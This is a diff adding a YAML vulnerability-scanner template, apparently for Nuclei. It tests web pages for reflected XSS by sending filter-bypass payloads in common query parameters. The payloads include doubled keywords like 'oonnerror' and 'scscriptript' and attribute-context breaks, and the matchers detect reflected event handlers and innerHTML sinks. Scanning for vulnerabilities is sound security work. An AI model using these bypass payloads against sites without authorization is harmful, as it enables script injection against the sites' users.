@@ -1,0 +1,72 @@
+id: xss-filter-bypass
+
+info:
+  name: XSS Filter Bypass Detection (script/on/javascript)
+  author: custom
+  severity: high
+  description: Detects XSS vulnerability with filter bypass for "script", "on", "javascript:" keywords
+  tags: xss,filter-bypass,custom
+
+variables:
+  random: "{{1}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}?q={{bypass}}"
+      - "{{BaseURL}}?search={{bypass}}"
+      - "{{BaseURL}}?param={{bypass}}"
+      - "{{BaseURL}}?query={{bypass}}"
+      - "{{BaseURL}}?keyword={{bypass}}"
+      - "{{BaseURL}}?input={{bypass}}"
+
+    payloads:
+      bypass:
+        # Double "on" to bypass single filter
+        - '<img src=x oonnerror="alert({{random}})">'
+        - '<img src=x oonnerror=alert({{random}})>'
+        # SVG and other tags with oonload
+        - '<svg oonload=alert({{random}})>'
+        - '<body oonload=alert({{random}})>'
+        - '<iframe oonload=alert({{random}})>'
+        # Other event handlers
+        - '<img src=x oonnclick=alert({{random}})>'
+        - '<img src=x oonnmouseover=alert({{random}})>'
+        # Script tag bypass
+        - '<scscriptript>alert({{random}})</scscriptript>'
+        # Context breaks
+        - '"><img src=x oonnerror=alert({{random}})>'
+        - "'><img src=x oonnerror=alert({{random}})>"
+
+    stop-at-first-match: true
+
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        name: reflected-xss-bypass
+        dsl:
+          - 'contains(body, "onerror")'
+          - 'contains(body, "onload")'
+          - 'contains(body, "onclick")'
+          - 'contains(body, "onmouseover")'
+          - 'status_code == 200'
+          - 'contains(content_type, "text/html")'
+        condition: and
+
+      - type: dsl
+        name: dom-xss-vulnerable-pattern
+        dsl:
+          - 'contains(body, ".innerHTML")'
+          - 'contains(body, "URLSearchParams")'
+          - 'status_code == 200'
+          - 'contains(content_type, "text/html")'
+        condition: and
+
+      - type: dsl
+        name: script-tag-bypass
+        dsl:
+          - 'contains(body, "<script>")'
+          - 'contains(body, "alert(")'
+          - 'status_code == 200'
+          - 'contains(content_type, "text/html")'
+        condition: and
